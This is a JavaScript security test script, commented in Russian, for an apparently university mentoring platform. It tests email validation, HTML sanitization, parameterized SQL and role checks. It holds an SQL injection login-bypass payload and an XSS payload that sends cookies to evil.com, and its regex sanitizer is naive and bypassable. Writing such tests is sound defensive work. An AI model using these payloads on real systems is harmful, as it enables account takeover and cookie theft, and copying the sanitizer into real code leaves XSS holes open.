
let passed = 0;
let failed = 0;

function check(label, condition) {
  if (condition) {
    console.log(`✅ PASS  — ${label}`);
    passed++;
  } else {
    console.log(`❌ FAIL  — ${label}`);
    failed++;
  }
}

function isValidKbtuEmail(email) {
  return /^[^\s@]+@kbtu\.kz$/.test(email);
}

function sanitizeHtml(input) {
  return input
    .replace(/<script[\s\S]*?<\/script>/gi, '')
    .replace(/on\w+="[^"]*"/gi, '')
    .replace(/javascript:/gi, '');
}

function isValidRole(role) {
  return ['student', 'mentor'].includes(role);
}

console.log('\n=== 1. SQL-ИНЪЕКЦИЯ ЧЕРЕЗ ФОРМУ ЛОГИНА ===\n');

const sqliPayload = {
  email: "admin@kbtu.kz' OR '1'='1",
  password: "' OR '1'='1' --",
};

function unsafeQuery(email, password) {
  return `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
}
console.log('Уязвимый запрос (если бы строка собиралась вручную):');
console.log('  ' + unsafeQuery(sqliPayload.email, sqliPayload.password));
console.log('  → вернул бы всех пользователей, минуя пароль!\n');

check(
  'Формат email с payload отклонён валидацией',
  !isValidKbtuEmail(sqliPayload.email)
);

function safeQueryParams(email, password) {
  return {
    text: 'SELECT * FROM users WHERE email = $1 AND password_hash = $2',
    values: [email, password],
  };
}
const safe = safeQueryParams(sqliPayload.email, sqliPayload.password);
check(
  'Параметризованный запрос не встраивает payload в текст SQL',
  safe.text.includes('$1') && !safe.text.includes(sqliPayload.email)
);

console.log('\n=== 2. XSS ЧЕРЕЗ ПОЛЕ ОТЗЫВА О МЕНТОРЕ ===\n');

const xssPayload = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
console.log('Payload от "пользователя":', xssPayload);

const cleaned = sanitizeHtml(xssPayload);
console.log('После санитизации:        ', cleaned || '(пусто)');

check('Тег <script> удалён из отзыва', !cleaned.includes('<script>'));
check('JS-код не может выполниться в браузере', !cleaned.includes('fetch('));

console.log('\n=== 3. ПОДДЕЛКА EMAIL ДЛЯ РЕГИСТРАЦИИ НЕ-СТУДЕНТА ===\n');

const fakeEmail = 'hacker@gmail.com';
check('Регистрация с не-университетской почтой отклонена', !isValidKbtuEmail(fakeEmail));

console.log('\n=== 4. ПОПЫТКА ЗАРЕГИСТРИРОВАТЬСЯ СРАЗУ АДМИНОМ ===\n');

check('Роль "admin" недоступна при регистрации (только student/mentor)', !isValidRole('admin'));

console.log(`\n=== ИТОГ: ${passed} успешно, ${failed} провалено ===\n`);
process.exit(failed > 0 ? 1 : 0);
